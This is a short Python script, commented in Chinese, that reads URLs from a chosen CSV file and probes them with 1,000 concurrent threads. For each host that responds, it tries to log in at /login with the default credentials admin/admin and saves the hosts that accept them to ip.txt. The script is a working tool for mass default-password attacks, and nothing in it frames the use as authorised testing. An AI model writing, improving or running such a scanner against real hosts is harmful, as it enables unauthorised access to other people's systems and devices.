import pandas as pd
import requests
from concurrent.futures import ThreadPoolExecutor
import os
import glob

def get_csv_files():
    """获取当前目录下的所有 CSV 文件"""
    return glob.glob('*.csv')

def select_csv_file():
    """让用户选择一个 CSV 文件"""
    csv_files = get_csv_files()
    if not csv_files:
        print("当前目录下没有找到 CSV 文件。")
        return None
    print("请选择一个 CSV 文件进行处理：")
    for idx, file in enumerate(csv_files):
        print(f"{idx + 1}: {file}")
    while True:
        try:
            choice = int(input("输入文件编号：")) - 1
            if 0 <= choice < len(csv_files):
                return csv_files[choice]
            else:
                print("无效的选择，请重新输入。")
        except ValueError:
            print("请输入有效的编号。")

def check_host(link, success_links):
    """检查主机状态并尝试登录，如果成功则记录结果"""
    try:
        response = requests.get(link, timeout=1)
        if response.status_code == 200:
            # 发送登录请求
            login_payload = {'username': 'admin', 'password': 'admin'}
            login_response = requests.post(f'{link}/login', data=login_payload, timeout=1)
            if 'true' in login_response.text:
                print(f'{link}')  # 只输出成功的链接
                success_links.append(link)  # 将成功的链接添加到列表中
    except requests.RequestException:
        pass  # 忽略异常，继续处理下一个链接

def main():
    csv_file = select_csv_file()
    if csv_file:
        df = pd.read_csv(csv_file)  # 读取选中的 CSV 文件
        link_list = df['link'].tolist()  # 假设链接列名是 'link'

        success_links = []  # 存储成功的链接

        # 使用 ThreadPoolExecutor 进行多线程处理
        with ThreadPoolExecutor(max_workers=1000) as executor:
            executor.map(lambda link: check_host(link, success_links), link_list)

        # 将成功的链接写入 ip.txt 文件
        with open('ip.txt', 'w') as f:
            for link in success_links:
                f.write(f'{link}\n')

if __name__ == "__main__":
    main()
